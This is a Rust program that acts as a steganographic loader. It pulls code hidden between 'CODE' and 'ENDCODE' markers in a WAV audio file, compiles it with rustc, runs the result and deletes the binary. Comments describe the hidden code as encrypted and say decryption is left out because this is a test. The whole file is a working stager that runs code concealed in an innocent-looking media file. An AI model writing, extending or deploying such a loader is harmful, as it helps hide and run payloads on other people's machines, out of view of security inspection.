extern crate hound;

use std::env;
use std::fs::File;
use std::io::Read;
use std::io::Write;
use std::process::Command;

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        println!("Usage: {} <path/to/your/wav/file.wav>", args[0]);
        return;
    }

    let filepath = &args[1];
    let code = extract_encrypted_code(filepath).expect("Failed to extract encrypted code");

    // Encrypted-Code is Decrypting here but * in this code is a Test so no encryption/decryption implemented
    let decrypted_code = String::from_utf8(code).expect("Failed to convert code to string");

    // Execute Decrypted-Code
    execute_code(&decrypted_code);
}

fn extract_encrypted_code(filepath: &str) -> std::io::Result<Vec<u8>> {
    let mut file = File::open(filepath)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let marker = b"CODE"; // Embedded WAV-file indicating a marker like "CODE" means start of embedded code
    let end_marker = b"ENDCODE"; // Also "ENDCODE" means end of embedded Code
    let marker_position = buffer
        .windows(marker.len())
        .position(|window| window == marker)
        .expect("Marker not found in WAV file");

    let end_marker_position = buffer
        .windows(end_marker.len())
        .position(|window| window == end_marker)
        .expect("End marker not found in WAV file");

    let code_start = marker_position + marker.len();
    let code_end = end_marker_position;
    let code = buffer[code_start..code_end].to_vec();

    Ok(code)
}

fn execute_code(code: &str) {
    // Write Code for temp
    let mut tmp_file = tempfile::Builder::new()
        .prefix("temp_code_")
        .suffix(".rs")
        .tempfile()
        .expect("Failed to create temporary file");
    tmp_file
        .write_all(code.as_bytes())
        .expect("Failed to write code to temporary file");
    let tmp_path = tmp_file.into_temp_path();

    // Compile the code here
    let output = Command::new("rustc")
        .arg(&tmp_path)
        .arg("-o")
        .arg("tmp_executable")
        .output()
        .expect("Failed to compile code");

    if !output.status.success() {
        eprintln!(
            "Compilation error: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        return;
    }

    // Execute binary written in temp
    let output = Command::new("./tmp_executable")
        .output()
        .expect("Failed to execute code");

    if output.status.success() {
        println!(
            "Code executed successfully: {}",
            String::from_utf8_lossy(&output.stdout)
        );
    } else {
        eprintln!(
            "Execution error: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    // Delete temp
    std::fs::remove_file("tmp_executable").expect("Failed to remove temporary executable");
}
